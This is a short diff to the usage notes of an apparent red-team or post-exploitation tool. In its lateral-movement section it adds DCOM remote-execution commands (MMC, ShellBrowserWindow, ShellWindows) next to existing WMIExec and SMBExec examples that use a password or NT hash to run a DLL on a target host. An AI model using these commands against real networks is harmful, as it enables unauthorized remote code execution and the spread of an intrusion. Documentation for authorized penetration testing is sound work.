@@ -126,6 +126,9 @@ Lateral Movement:
 ==================
 run-exe WMIExec.Program WExec -t 10.0.0.1 -u admin -d domain -p password1 -c "rundll32 c:\\users\\public\\run.dll,etp"
 run-exe SMBExec.Program SExec -t 10.0.0.1 -u admin -d domain -h <nthash> -c "rundll32 c:\\users\\public\\run.dll,etp"
+run-exe Invoke_DCOM.Program DCOM -t 10.0.0.1 -m mmc -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
+run-exe Invoke_DCOM.Program DCOM -t 10.0.0.1 -m shellbrowserwindow -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
+run-exe Invoke_DCOM.Program DCOM -t 10.0.0.1 -m shellwindows -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
 
 Socks:
 ======
